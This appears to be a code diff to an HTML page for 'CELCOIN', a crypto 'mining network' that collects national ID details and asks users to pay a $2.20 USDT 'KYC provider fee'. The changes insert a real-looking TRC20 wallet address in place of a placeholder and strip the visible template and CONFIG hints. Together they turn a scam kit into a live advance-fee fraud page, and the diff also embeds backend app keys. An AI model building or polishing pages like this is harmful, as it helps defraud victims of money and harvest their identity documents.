@@ -51,7 +51,7 @@ input, select{width:100%;padding:14px;border:1px solid #e2e8f0;border-radius:14p
 <body>
 <div class="launch-banner"><div class="marquee">🚀 LAUNCHING 23 DEC 2026 • CONNECT YOUR WALLET NOW • MIN 1000 CEL = $50 • RATE $0.05/CEL • KYC VERIFICATION BASED ON COUNTRY 🚀</div></div>
 <header>
-  <div class="logo-wrap"><img src="https://i.imgur.com/8Km9tLL.png" class="logo-img"><div class="logo-text"><b>CELCOIN</b><span>celcoin mining network</span></div></div>
+  <div class="logo-wrap"><img src="data:image/webp;base64,[STRIPPED]..." class="logo-img"><div class="logo-text"><b>CELCOIN</b><span>celcoin mining network</span></div></div>
   <button onclick="logout()" style="background:#f1f5f9;border:none;padding:8px 14px;border-radius:10px;font-weight:700;font-size:11px;cursor:pointer">Logout</button>
 </header>
 <div class="container">
@@ -123,7 +123,7 @@ input, select{width:100%;padding:14px;border:1px solid #e2e8f0;border-radius:14p
         </div>
       </div>
       <div id="step3" style="display:none">
-        <div class="alert alert-green"><span>✅</span><div><b>Verification details saved!</b><br>Final step: Pay <b>$2.20 KYC provider fee</b>. Mining ends at launch, after that we focus only on paying verified users.</div></div>
+        <div class="alert alert-green"><span>✅</span><div><b>Verification details saved!</b><br>Final step: Pay <b>$2.20 KYC provider fee</b>. Mining ends at launch, after that only verified users are paid.</div></div>
         <div class="usdt-box">
           <label style="font-size:11px;font-weight:800;color:#64748b;text-transform:uppercase;display:block;margin-bottom:6px">Pay $2.20 USDT to KYC Provider (TRC20 ONLY)</label>
           <div style="font-size:12px;margin-bottom:6px"><b>Network:</b> USDT TRC20 • <b>Amount:</b> $2.20 • <b>Purpose:</b> KYC verification</div>
@@ -132,7 +132,7 @@ input, select{width:100%;padding:14px;border:1px solid #e2e8f0;border-radius:14p
             <button style="background:#fff;border:1px solid #e2e8f0;padding:6px 10px;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer" onclick="copyUSDT()">Copy</button>
           </div>
           <div style="font-size:11px;color:#64748b;line-height:1.4">
-            ⚠️ Send exactly $2.20 USDT TRC20 ONLY. This fee covers ID verification (NIN/BVN/Passport etc) based on your country. Set your address in CONFIG at top of file.
+            ⚠️ Send exactly $2.20 USDT TRC20 ONLY. This fee covers ID verification (NIN/BVN/Passport etc) based on your country.
           </div>
         </div>
         <label style="font-size:11px;font-weight:800;color:#64748b;text-transform:uppercase;display:block;margin-bottom:6px">Transaction ID / Hash</label>
@@ -141,7 +141,7 @@ input, select{width:100%;padding:14px;border:1px solid #e2e8f0;border-radius:14p
           <button class="btn btn-outline" style="flex:1" onclick="goToStep2()">← Back</button>
           <button class="btn btn-teal" style="flex:2" id="paidBtn" onclick="submitPaid()">💰 I Have Paid $2.20 KYC Fee</button>
         </div>
-        <p style="text-align:center;font-size:10px;color:#94a3b8;margin-top:10px">CONFIG: Replace YOUR_USDT_TRC20_ADDRESS_HERE in code • TRC20 ONLY • Admin confirms 2-12h</p>
+        <p style="text-align:center;font-size:10px;color:#94a3b8;margin-top:10px">confirmation 2-12h</p>
       </div>
     </div>
   </div>
@@ -154,7 +154,7 @@ input, select{width:100%;padding:14px;border:1px solid #e2e8f0;border-radius:14p
 </div>
 <script>
 // ================= CONFIG - CHANGE HERE =================
-const USDT_TRC20_KYC_ADDRESS = "YOUR_USDT_TRC20_ADDRESS_HERE"; // <-- PUT YOUR TRC20 ADDRESS HERE
+const USDT_TRC20_KYC_ADDRESS = "THJmSifxZUTZJvR8EhDt4CBMjYP1NvUTb"; // <-- PUT YOUR TRC20 ADDRESS HERE
 const KYC_FEE_USD = 2.20;
 // =======================================================
 Backendless.initApp('9FCDC961-9B0A-4C69-B461-93E55A07BA66', '1D7B1EB4-11B4-4FE9-99D6-D146155BA699');
